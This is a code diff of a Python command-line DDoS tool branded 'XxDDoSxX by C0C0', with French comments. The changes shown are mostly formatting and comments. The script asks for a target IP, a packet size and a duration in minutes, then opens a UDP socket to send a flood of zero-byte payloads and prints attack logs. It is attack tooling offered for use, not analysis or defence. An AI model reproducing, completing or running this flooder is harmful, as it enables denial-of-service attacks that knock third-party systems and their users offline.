@@ -27,7 +27,6 @@ def printLightPurple(text):
 def printCyan(text):
  print("\033[96m{}\033[00m".format(text))
 
-
 # Setup de clear + bannière
 def style():
 	os.system("clear")
@@ -41,7 +40,6 @@ def style():
 	printCyan("===========================================================================")
 	printLightPurple("                           //XxDDoSxX by C0C0\\\\") 
 	printCyan("===========================================================================")
-
 
 # Fonction de bienvenue
 def welcome():
@@ -73,8 +71,6 @@ def welcome():
 	printYellow(" Time in minutes")
 	printPurple("  [*]")
 	printYellow(" Relaunch\n\n")
-
-
 
 # Fonction pour le chargement
 def loading():
@@ -127,7 +123,6 @@ def loading():
 	t.sleep(1.2)
 
 
-
 # Setup de now (Heure actuelle en secondes)
 def now():
 	now = datetime.datetime.now()
@@ -136,12 +131,13 @@ def now():
 	return nowSecond   
 
 
-# Définition des variables
+# Définition des variables, pre setup du ddos
 relaunch = ""
 ipSave = ""
 	                     
 
 # Programme principal
+# Écran de bienvenue
 try:
 	welcome()
 	infos = input()
@@ -151,9 +147,12 @@ except KeyboardInterrupt:
 	t.sleep(2)
 	os.system("clear")
 	sys.exit()
+
+
 def ddos():
 	
 
+	# Vérifie l'adresse ip
 	global relaunch, ipSave
 	style()
 	printGreen("\n                     Infos : Works best with local IP")
@@ -252,6 +251,7 @@ def ddos():
 		printRed("                  Error : Number of Time is not interval")
 		printPurple("\n[4]")
 		time = inputYellow(" Time in Minutes (int, Min : 1, Max : 1439) : ")
+		
 
 	# Fonction pour lire la console sans interrompre
 	def inputNoInterrupted():
@@ -267,16 +267,20 @@ def ddos():
 					return exit
 
 	# Définition de thread
+	global thread
 	thread = threading.Thread(target=inputNoInterrupted)
 
 
 	# Chargement
 	loading()
-
+	
+	
+	# Setup du ddos
 	# Message avec nombre de bytes
 	send = "0"*bytes
 
 	# Création d'un paquet UDP
+	global sock
 	sock = socket.socket(socket.AF_INET, 	socket.SOCK_DGRAM)
 
 	# Heure de fin (en secondes)
@@ -331,13 +335,14 @@ def ddos():
 			thread.join()
 			exit = "0"
 			
-				# Conversion du temps d'attaque total en hh:mm:ss
+			# Conversion du temps d'attaque total en hh:mm:ss
 			(hoursPrintTotal, secondsPrintTotal) = divmod(timeEnd, 3600)
 			(minutePrintTotal, secondsPrintTotal) = divmod(secondsPrintTotal, 60)
 			hoursPrintTotal = "0" + str(hoursPrintTotal) if hoursPrintTotal < 10 else hoursPrintTotal
 			minutePrintTotal = "0" + str(minutePrintTotal) if minutePrintTotal < 10 else minutePrintTotal
 			secondsPrintTotal = "0" + str(secondsPrintTotal) if secondsPrintTotal < 10 else secondsPrintTotal
-			
+
+			# Affichage des logs total
 			style()
 			printRed("\n                                 Finish !\n                               Total logs : ")
 			logsTotalHours = "\n["+str(hoursPrintTotal)+":"+str(minutePrintTotal)+":"+str(secondsPrintTotal)+"]"
@@ -345,6 +350,8 @@ def ddos():
 			printPurple(logsTotalHours)
 			printGreen(logsTotal)
 			printPurple("\n[*]")
+
+			# Relancer
 			relaunch = inputYellow(" Relaunch ? (y/n) : ")
 			while True:
 				if relaunch == "y" or relaunch == "Y" or relaunch == "yes" or relaunch == "Yes":
@@ -373,6 +380,7 @@ except KeyboardInterrupt:
 	style()
 	printRed("\n                                   Bye !")
 	t.sleep(2)
+	sock.close()
 	thread.join()
 	os.system("clear")
 	sys.exit()
